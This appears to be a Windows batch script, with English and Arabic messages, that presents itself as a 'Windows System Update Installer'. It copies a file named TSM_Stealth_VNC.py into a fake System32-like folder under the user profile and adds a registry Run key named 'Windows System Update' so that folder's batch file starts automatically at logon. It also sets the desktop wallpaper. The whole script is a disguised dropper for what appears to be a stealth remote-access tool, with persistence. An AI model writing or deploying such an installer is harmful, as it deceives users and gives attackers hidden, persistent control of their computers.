@echo off
echo Windows System Update Installer
echo مثبت تحديث نظام Windows
echo.

REM إنشاء مجلد النظام
set SYSTEM_DIR=%USERPROFILE%\Windows\System32\Update
if not exist "%SYSTEM_DIR%" mkdir "%SYSTEM_DIR%"

REM نسخ الملفات
copy "system_wallpaper.png" "%SYSTEM_DIR%\"
copy "TSM_Stealth_VNC.py" "%SYSTEM_DIR%\"
copy "system_update.bat" "%SYSTEM_DIR%\"

REM إعداد التفعيل التلقائي
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Windows System Update" /t REG_SZ /d "%SYSTEM_DIR%\system_update.bat" /f

REM إعداد خلفية الشاشة
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "Wallpaper" /t REG_SZ /d "%SYSTEM_DIR%\system_wallpaper.png" /f

echo.
echo System update installation completed!
echo تم الانتهاء من تثبيت تحديث النظام!
echo.
echo The system will update automatically on next boot.
echo سيتم تحديث النظام تلقائياً عند بدء التشغيل التالي.
echo.
echo Setting wallpaper...
echo تعيين خلفية الشاشة...
rundll32.exe user32.dll,UpdatePerUserSystemParameters
echo.
pause
